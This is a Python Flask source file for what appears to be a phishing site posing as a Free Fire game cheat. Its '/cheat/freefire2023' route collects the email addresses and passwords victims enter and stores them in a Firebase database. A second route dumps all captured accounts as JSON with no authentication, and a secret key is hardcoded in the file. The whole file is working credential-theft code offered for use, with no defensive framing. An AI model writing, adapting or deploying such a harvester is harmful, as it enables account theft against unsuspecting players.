from flask import Flask, render_template, request,jsonify
import pyrebase,json
config=json.loads(open("dbaddrs.json","r").read())

firebase = pyrebase.initialize_app(config)
db = firebase.database()

app = Flask(__name__,static_url_path='/static')
app.config["SECRET_KEY"] = "asddasdwadsadwaasdasdsdad412sDADsss"
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True

@app.route("/cheat/freefire2023",methods=["GET","POST"])
def fflogin():
    if request.method == "POST":
        datalogin={}
        email = request.form.get("email")
        datalogin["email"]=email
        password = request.form.get("password")
        datalogin["password"]=password
        print(datalogin)
        if "@" in datalogin["email"]:
            db.child("account").child("ff").push(datalogin)
    return render_template('FFLogin.html')

@app.route("/cheat/freefirecek",methods=["GET","POST"])
def ffcek():
    req = db.child('account').child('ff').get()
    acc = req.val()
    return jsonify(acc)




if __name__ == "__main__":
    # app.run(host="0.0.0.0",debug=True, use_reloader=True,port=8000)
    from waitress import serve
    serve(app, port=8000, host='0.0.0.0')